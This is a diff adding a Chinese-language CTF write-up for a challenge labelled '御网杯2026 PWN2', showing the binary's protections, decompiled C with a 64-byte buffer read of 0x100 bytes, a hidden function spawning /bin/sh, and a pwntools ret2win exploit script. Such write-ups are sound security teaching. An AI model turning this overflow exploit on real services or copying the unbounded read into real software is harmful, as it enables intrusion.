@@ -912,3 +912,93 @@ r.interactive()
 
 
 
+## 10.[御网杯2026] PWN2
+
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
+
+等待上传，请稍后
+
+::
+
+### 0x01 分析程序
+
+这题和上面那题都是一样的思路
+
+```asm
+	Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+
+
+函数分析
+
+main() -> 0x04011F6
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  vuln();
+  return 0;
+}
+```
+
+vuln -> 0x04011AD
+
+```c
+int vuln()
+{
+  char buf[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  puts("=== Note Service ===");
+  puts("Leave your note:");
+  read(0, buf, 0x100uLL);
+  return puts("Note saved. Thank you!");
+}
+```
+
+发现漏洞函数
+
+secert_note() -> 0x0401196
+
+```c
+int secret_note()
+{
+  return system("/bin/sh");
+}
+```
+
+通过观察发现vuln存在read的栈溢出，buf仅仅需要0x40而read却读取0x100，
+
+```c
+目标链子
+main()->vlun()->read()->secert_note()
+```
+
+---
+
+### 0x02 EXP
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64')
+
+r = process('./vuln')
+offset = 0x40+0x8
+system =0x401196
+r.recvuntil(b'Leave your note:\n')
+ret = 0x040124A
+payload = offset * b'A' +p64(ret) + p64(system)
+
+r.sendline(payload)
+r.interactive()
+```
